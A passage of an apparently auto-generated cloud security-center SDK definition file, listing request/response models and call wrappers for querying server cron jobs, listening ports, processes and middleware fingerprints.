  user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyCronDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmd?: string(name='Cmd', description='The command that is used to run the scheduled task.', example='/usr/lib64/sa/sa1 1 1'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      md5?: string(name='Md5', description='The MD5 hash value of the path to the scheduled task.', example='4cc8f97c2bf9cbabb2c2be2erqw****'),
      period?: string(name='Period', description='The interval at which the scheduled task is performed.', example='*/10 * * * *'),
      source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root'),
      user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of the scheduled tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B0C4E12E-CCE1-109D-9E62-7B95CBBAEF8C'),
}

model DescribePropertyCronDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronDetailResponseBody(name='body'),
}

async function describePropertyCronDetailWithOptions(request: DescribePropertyCronDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyCronDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronDetail(request: DescribePropertyCronDetailRequest): DescribePropertyCronDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronDetailWithOptions(request, runtime);
}

model DescribePropertyCronItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  pageSize?: int32(name='PageSize'),
  source?: string(name='Source'),
}

model DescribePropertyCronItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      source?: string(name='Source'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyCronItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronItemResponseBody(name='body'),
}

async function describePropertyCronItemWithOptions(request: DescribePropertyCronItemRequest, runtime: Util.RuntimeOptions): DescribePropertyCronItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronItem(request: DescribePropertyCronItemRequest): DescribePropertyCronItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronItemWithOptions(request, runtime);
}

model DescribePropertyPortDetailRequest {
  bindIp?: string(name='BindIp'),
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  pageSize?: int32(name='PageSize'),
  port?: string(name='Port'),
  procName?: string(name='ProcName'),
  remark?: string(name='Remark'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyPortDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      bindIp?: string(name='BindIp'),
      createTimestamp?: long(name='CreateTimestamp'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      pid?: string(name='Pid'),
      port?: string(name='Port'),
      procName?: string(name='ProcName'),
      proto?: string(name='Proto'),
      uuid?: string(name='Uuid'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyPortDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortDetailResponseBody(name='body'),
}

async function describePropertyPortDetailWithOptions(request: DescribePropertyPortDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyPortDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindIp)) {
    query['BindIp'] = request.bindIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.procName)) {
    query['ProcName'] = request.procName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortDetail(request: DescribePropertyPortDetailRequest): DescribePropertyPortDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortDetailWithOptions(request, runtime);
}

model DescribePropertyPortItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='5'),
  port?: string(name='Port', description='The port number.', example='22'),
}

model DescribePropertyPortItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='163'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers that use the port.', example='495'),
      port?: string(name='Port', description='The number of the listening port.', example='22'),
      proto?: string(name='Proto', description='The network protocol of the port.', example='tcp'),
    }
  ](name='PropertyItems', description='An array that consists of the ports returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyPortItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortItemResponseBody(name='body'),
}

async function describePropertyPortItemWithOptions(request: DescribePropertyPortItemRequest, runtime: Util.RuntimeOptions): DescribePropertyPortItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortItem(request: DescribePropertyPortItemRequest): DescribePropertyPortItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortItemWithOptions(request, runtime);
}

model DescribePropertyProcDetailRequest {
  cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by process name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  name?: string(name='Name', description='The name of the process.', example='8888'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  procTimeEnd?: long(name='ProcTimeEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1649587453000'),
  procTimeStart?: long(name='ProcTimeStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1648809853000'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  user?: string(name='User', description='The user who runs the process.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyProcDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of last data collection. Unit: milliseconds.', example='1565686951000'),
      euidName?: string(name='EuidName', description='The permission that is required to run the process.', example='root'),
      instanceId?: string(name='InstanceId', description='The ID of the server that is associated with the process.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server that is associated with the process.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      isPackage?: int32(name='IsPackage', description='Indicates whether the process is a package installation process. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      md5?: string(name='Md5', description='The MD5 hash value of the process file.', example='842644ea3d88bd7f7e14c1c089ef****'),
      name?: string(name='Name', description='The name of the process.', example='agetty'),
      path?: string(name='Path', description='The path of the process.', example='/root/Oracle/Middleware/***/8888'),
      pid?: string(name='Pid', description='The ID of the process.', example='12826'),
      pname?: string(name='Pname', description='The name of the parent process to which the process belongs.', example='start***.s'),
      startTime?: string(name='StartTime', description='The time when the process starts.', example='2019-08-07 10:09:05'),
      startTimeDt?: long(name='StartTimeDt', description='The timestamp when the process starts. Unit: milliseconds.', example='1648783107000'),
      state?: string(name='State', description='The status of the process.', example='sleeping'),
      user?: string(name='User', description='The user who runs the process.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server that is associated with the process.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='An array that consists of the fingerprints of the processes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AA47D46F-10DE-138C-BBB4-8A0003F75CD7'),
}

model DescribePropertyProcDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcDetailResponseBody(name='body'),
}

async function describePropertyProcDetailWithOptions(request: DescribePropertyProcDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyProcDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.procTimeEnd)) {
    query['ProcTimeEnd'] = request.procTimeEnd;
  }
  if (!Util.isUnset(request.procTimeStart)) {
    query['ProcTimeStart'] = request.procTimeStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcDetail(request: DescribePropertyProcDetailRequest): DescribePropertyProcDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcDetailWithOptions(request, runtime);
}

model DescribePropertyProcItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  name?: string(name='Name', description='The name of the process.', example='test'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
}

model DescribePropertyProcItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='372'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the process runs.', example='8888'),
      name?: string(name='Name', description='The name of the process.', example='.ss'),
    }
  ](name='PropertyItems', description='An array that consists of the processes returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BD8AD4C6-A169-4FA3-BA1F-ED40ED52973B'),
}

model DescribePropertyProcItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcItemResponseBody(name='body'),
}

async function describePropertyProcItemWithOptions(request: DescribePropertyProcItemRequest, runtime: Util.RuntimeOptions): DescribePropertyProcItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcItem(request: DescribePropertyProcItemRequest): DescribePropertyProcItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcItemWithOptions(request, runtime);
}

model DescribePropertyScaDetailRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

>  If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca'),
  bizType?: string(name='BizType', description='The type of the middleware, database, or web service that you want to query. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='system_service'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: long(name='Name', description='The name of the middleware, database, or web service.

>  This parameter is deprecated. You can ignore it.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.

>  We recommend that you do not leave this parameter empty.', example='10'),
  pid?: string(name='Pid', description='The PID.', example='756'),
  port?: string(name='Port', description='The port that the process monitors.', example='68'),
  processStartedEnd?: long(name='ProcessStartedEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1641110965'),
  processStartedStart?: long(name='ProcessStartedStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1641024565'),
  remark?: string(name='Remark', description='The search condition, such as a server name or a server IP address.

>  Fuzzy match is supported.', example='192.168'),
  scaName?: string(name='ScaName', description='The name of the asset fingerprint that you want to query.', example='openssl'),
  scaNamePattern?: string(name='ScaNamePattern', description='The name of the process.', example='open'),
  scaVersion?: string(name='ScaVersion', description='The version of the middleware, database, or web service.', example='1.0.2k'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='openssl'),
  searchInfoSub?: string(name='SearchInfoSub', description='The keyword of the subquery. You must specify this parameter based on the value of the **SearchItemSub** parameter.

*   If the **SearchItemSub** parameter is set to **port**, you must enter a port number.
*   If the **SearchItemSub** parameter is set to **pid**, you must enter a process ID (PID).
*   If the **SearchItemSub** parameter is set to **version**, you must enter the version of a database, middleware, or web service.
*   If the **SearchItemSub** parameter is set to **user**, you must enter a username.

>  The subquery is used to search for data of a specified database, middleware, or web service.', example='1.0.2k'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='name'),
  searchItemSub?: string(name='SearchItemSub', description='The type of the subquery. Valid values:

*   **port**
*   **pid**
*   **version**
*   **user**', example='version'),
  user?: string(name='User', description='The user who runs the process.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-ab****'),
}

model DescribePropertyScaDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='software_library'),
      bizTypeDispaly?: string(name='BizTypeDispaly', description='The display name of the type of the middleware, database, or web service . Valid values:

*   System service
*   Software library
*   Container component
*   Database
*   Web container
*   JAR package
*   Web framework', example='System Service'),
      cmdline?: string(name='Cmdline', description='The command line of the process.', example='/sbin/dhclient -H iz2zeflhhbtk8gtxzt087az -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid eth0'),
      configPath?: string(name='ConfigPath', description='The path to the configuration file.', example='/etc/my.cnf'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
      createTimestamp?: long(name='CreateTimestamp', description='The latest collection timestamp, which indicates the last timestamp when Security Center collected the information about the middleware, database, or web service. Unit: milliseconds.', example='1597987834000'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server on which the middleware, database, or web service is run.', example='i-2zeclqj7ti****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the middleware, database, or web service is run.', example='Test01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the middleware, database, or web service is run.', example='192.210.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      listenIp?: string(name='ListenIp', description='The IP address that the process monitors.', example='0.0.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The protocol of the traffic on which the process listens. Valid values:

*   **UDP**
*   **TCP**', example='UDP'),
      listenStatus?: string(name='ListenStatus', description='The listening status of the process. Valid values:

*   **NONE**: not listening
*   **LISTEN**: listening', example='NONE'),
      name?: string(name='Name', description='The name of the middleware, database, or web service.', example='openssl'),
      path?: string(name='Path', description='The path of the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      pid?: string(name='Pid', description='The PID.', example='756'),
      port?: string(name='Port', description='The port of the middleware, database, or web service.', example='68'),
      ppid?: string(name='Ppid', description='The ID of the parent process.', example='1'),
      processStarted?: long(name='ProcessStarted', description='The timestamp when the process starts. Unit: milliseconds.', example='1596539788'),
      processUser?: string(name='ProcessUser', description='The name of the user who runs the process.', example='root'),
      proof?: string(name='Proof', description='The version verification information about the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      runtimeEnvVersion?: string(name='RuntimeEnvVersion', description='The version of the runtime environment.

>  The value of this parameter can be the Java Development Kit (JDK) version of the runtime environment for a Java process.', example='1.8.0_144'),
      type?: string(name='Type', description='The type of the middleware, database, or web service.', example='library'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-a****'),
      version?: string(name='Version', description='The version of the middleware, database, or web service.', example='1.0.2k'),
      webPath?: string(name='WebPath', description='The web directory.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='The details about the asset fingerprints returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9146867-16C8-4AAB-BB4FB8C2A4'),
}

model DescribePropertyScaDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaDetailResponseBody(name='body'),
}

async function describePropertyScaDetailWithOptions(request: DescribePropertyScaDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyScaDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pid)) {
    query['Pid'] = request.pid;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.processStartedEnd)) {
    query['ProcessStartedEnd'] = request.processStartedEnd;
  }
  if (!Util.isUnset(request.processStartedStart)) {
    query['ProcessStartedStart'] = request.processStartedStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.scaName)) {
    query['ScaName'] = request.scaName;
  }
  if (!Util.isUnset(request.scaNamePattern)) {
    query['ScaNamePattern'] = request.scaNamePattern;
  }
  if (!Util.isUnset(request.scaVersion)) {
    query['ScaVersion'] = request.scaVersion;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchInfoSub)) {
    query['SearchInfoSub'] = request.searchInfoSub;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  if (!Util.isUnset(request.searchItemSub)) {
    query['SearchItemSub'] = request.searchItemSub;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaDetail(request: DescribePropertyScaDetailRequest): DescribePropertyScaDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaDetailWithOptions(request, runtime);
}

model DescribePropertyScaItemRequest {
  biz?: string(name='Biz', example='sca'),
  currentPage?: int32(name='CurrentPage', example='1'),
  forceFlush?: boolean(name='ForceFlush', example='false'),
  lang?: string(name='Lang', example='en'),
  pageSize?: int32(name='PageSize', example='20'),
  searchInfo?: string(name='SearchInfo', example='system_service'),
  searchItem?: string(name='SearchItem', example='type'),
}

model DescribePropertyScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='27'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      bizType?: string(name='BizType', example='docker_component'),
      count?: int32(name='Count', example='23'),
      name?: string(name='Name', example='kubelet'),
      typeDisplay?: string(name='TypeDisplay', example='Docker Component'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
}

model DescribePropertyScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaItemResponseBody(name='body'),
}

async function describePropertyScaItemWithOptions(request: DescribePropertyScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaItem(request: DescribePropertyScaItemRequest): DescribePropertyScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaItemWithOptions(request, runtime);
}

model DescribePropertyScheduleConfigRequest {
  type?: string(name='Type'),
}

model DescribePropertyScheduleConfigResponseBody = {
  config?: string(name='Config'),
  requestId?: string(name='RequestId'),
}

